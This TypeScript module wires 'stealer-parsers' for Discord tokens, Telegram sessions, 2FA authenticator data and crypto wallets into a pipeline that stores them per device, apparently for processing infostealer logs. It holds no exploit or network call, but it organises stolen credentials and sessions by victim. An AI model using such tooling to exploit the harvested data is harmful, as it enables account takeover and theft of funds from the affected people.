/**
 * Parse Messaging & Wallet Data Integration
 *
 * Integrates Discord, Telegram, 2FA, and Crypto Wallet parsers into the processing pipeline
 */

import path from "path"
import { parseAllDiscordTokens } from "./stealer-parsers/discord-parser"
import { parseAllTelegramSessions } from "./stealer-parsers/telegram-parser"
import { parseAllAuthenticatorData } from "./stealer-parsers/authenticator-parser"
import { parseAllCryptoWallets } from "./stealer-parsers/wallet-parser"
import {
  insertDiscordTokens,
  insertTelegramSessions,
  insertAuthenticatorData,
  insertCryptoWallets,
} from "./db-messaging-helpers"

/**
 * Parse and store all messaging & wallet data for a device
 */
export async function parseAndStoreMessagingWalletData(
  deviceId: string,
  extractionDir: string,
  progressCallback?: (progress: number, message: string) => Promise<void>,
): Promise<{
  discord_tokens: number
  telegram_sessions: number
  authenticator_data: number
  crypto_wallets: number
}> {
  const counts = {
    discord_tokens: 0,
    telegram_sessions: 0,
    authenticator_data: 0,
    crypto_wallets: 0,
  }

  try {
    // Parse Discord tokens
    if (progressCallback) {
      await progressCallback(0, "🎮 Parsing Discord tokens...")
    }

    const discordTokens = parseAllDiscordTokens(extractionDir)
    if (discordTokens.length > 0) {
      counts.discord_tokens = await insertDiscordTokens(deviceId, discordTokens)
      console.log(`✅ Found ${counts.discord_tokens} Discord token(s)`)
    }

    // Parse Telegram sessions
    if (progressCallback) {
      await progressCallback(25, "📱 Parsing Telegram sessions...")
    }

    const telegramSessions = parseAllTelegramSessions(extractionDir)
    if (telegramSessions.length > 0) {
      counts.telegram_sessions = await insertTelegramSessions(deviceId, telegramSessions)
      console.log(`✅ Found ${counts.telegram_sessions} Telegram session(s)`)
    }

    // Parse 2FA/Authenticator data
    if (progressCallback) {
      await progressCallback(50, "🔐 Parsing 2FA/Authenticator data...")
    }

    const authData = parseAllAuthenticatorData(extractionDir)
    if (authData.length > 0) {
      counts.authenticator_data = await insertAuthenticatorData(deviceId, authData)
      console.log(`✅ Found ${counts.authenticator_data} 2FA/Authenticator entry(ies)`)
    }

    // Parse crypto wallets
    if (progressCallback) {
      await progressCallback(75, "💰 Parsing crypto wallets...")
    }

    const wallets = parseAllCryptoWallets(extractionDir)
    if (wallets.length > 0) {
      counts.crypto_wallets = await insertCryptoWallets(deviceId, wallets)
      console.log(`✅ Found ${counts.crypto_wallets} crypto wallet(s)`)
    }

    if (progressCallback) {
      await progressCallback(100, "✅ Messaging & wallet parsing complete")
    }

    return counts
  } catch (error) {
    console.error("❌ Error parsing messaging/wallet data:", error)
    return counts
  }
}
